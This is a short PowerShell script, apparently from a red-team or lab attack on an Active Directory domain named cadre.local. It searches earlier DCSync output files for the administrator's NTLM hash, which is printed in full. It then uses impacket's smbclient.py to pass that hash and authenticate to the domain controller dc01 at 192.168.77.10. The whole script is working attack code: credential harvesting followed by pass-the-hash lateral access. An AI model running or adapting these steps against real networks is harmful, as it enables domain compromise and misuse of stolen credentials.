Write-Output "=== earlier dcsync-out.txt administrator hash (T009 reference) ==="
Get-Content C:\Tools\cadre-attack\dcsync-out.txt 2>&1 | Select-String -Pattern "administrator" -SimpleMatch
Write-Output "=== also check T010/T102 output for admin hash ==="
Get-ChildItem C:\Tools\cadre-attack -Filter "*.txt" -Name | ForEach-Object {
    $hits = Select-String -Path "C:\Tools\cadre-attack\$_" -Pattern "aad3b435b51404eeaad3b435b51404ee" -SimpleMatch -ErrorAction SilentlyContinue
    if ($hits) { Write-Output "MATCH in $_" }
}
Write-Output "=== verify hash authenticates to dc01 SMB ==="
python "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\smbclient.py" "cadre.local/administrator:aad3b435b51404eeaad3b435b51404ee:81c3b6443f148bf73bb3499791f1eb7b@dc01.cadre.local" -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:81c3b6443f148bf73bb3499791f1eb7b -target-ip 192.168.77.10 -c "ls" 2>&1 | Select-Object -First 15
